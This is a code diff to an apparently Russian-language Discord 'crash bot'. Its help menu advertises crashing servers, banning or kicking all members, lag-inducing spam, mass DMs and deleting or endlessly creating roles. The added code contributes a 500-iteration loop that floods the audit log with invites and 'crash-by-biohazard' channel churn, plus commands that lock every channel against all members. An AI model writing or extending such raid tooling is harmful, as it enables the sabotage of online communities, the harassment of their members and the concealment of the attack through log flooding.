@@ -27,6 +27,9 @@ class MyClient(discord.Client):
 			cdn = 1
 			embed = discord.Embed(title=":grey_question: Помощь", description="", color=0x00cc00)
 			embed.add_field(name='*атака', value='Автоматический краш сервера', inline=False)
+			embed.add_field(name='*аудит', value='Засорить журнал аудита приглашениями и созданием/удалением каналов', inline=False)
+			embed.add_field(name='*блок', value='Заблокировать текущий канал (запретить всем отправлять сообщения)', inline=False)
+			embed.add_field(name='*блоквезде', value='Заблокировать все каналы (запретить всем отправлять сообщения)', inline=False)
 			embed.add_field(name='*бс', value='Проверка сервера на наличие в белом списке', inline=False)
 			embed.add_field(name='*всембан', value='Забанить всех участников', inline=False)
 			embed.add_field(name='*всемкик', value='Кикнуть всех участников', inline=False)
@@ -40,6 +43,8 @@ class MyClient(discord.Client):
 			embed.add_field(name='*лаги', value='Чудовищный спам, вызывает лаги', inline=False)
 			embed.add_field(name='*лс', value='Рассылка всем участникам в ЛС', inline=False)
 			embed.add_field(name='*переименовать', value='Перименовать сервер', inline=False)
+			embed.add_field(name='*разблок', value='Разблокировать текущий канал (разрешить всем отправлять сообщения)', inline=False)
+			embed.add_field(name='*разблоквезде', value='Разблокировать все каналы (разрешить всем отправлять сообщения)', inline=False)
 			embed.add_field(name='*роли-', value='Удалить все роли', inline=False)
 			embed.add_field(name='*роли+', value='Бесконечное создание ролей', inline=False)
 			embed.add_field(name='*селфбан', value='Забанить себя (может быть, кому-то пригодится :moyai:)', inline=False)
@@ -417,6 +422,36 @@ class MyClient(discord.Client):
 					await message.author.ban()
 				else:
 					await message.channel.send(':x: Вы не можете забанить себя, т.к. являетесь владельцем сервера.')
+					
+			if message.content == '*аудит' and not message.author.bot:
+				await message.delete()
+				while c < 500:
+					oi = await message.channel.create_invite(max_age=86400)
+					ch = await message.guild.create_text_channel(name='crash-by-biohazard')
+					await ch.delete()
+					c += 1
+					
+			if message.content == '*блок' and not message.author.bot:
+				await message.delete()
+				await message.channel.set_permissions(message.guild.default_role, send_messages=False)
+				await message.author.send(':white_check_mark:')
+				
+			if message.content == '*разблок' and not message.author.bot:
+				await message.delete()
+				await message.channel.set_permissions(message.guild.default_role, send_messages=True)
+				await message.author.send(':white_check_mark:')
+				
+			if message.content == '*блоквезде' and not message.author.bot:
+				await message.delete()
+				for i in message.guild.text_channels:
+					await i.set_permissions(message.guild.default_role, send_messages=False)
+				await message.author.send(':white_check_mark:')
+				
+			if message.content == '*разблоквезде' and not message.author.bot:
+				await message.delete()
+				for i in message.guild.text_channels:
+					await i.set_permissions(message.guild.default_role, send_messages=True)
+				await message.author.send(':white_check_mark:')
 					
 					
 			if vips.find(str(message.author.id)) != -1 and not message.author.bot:
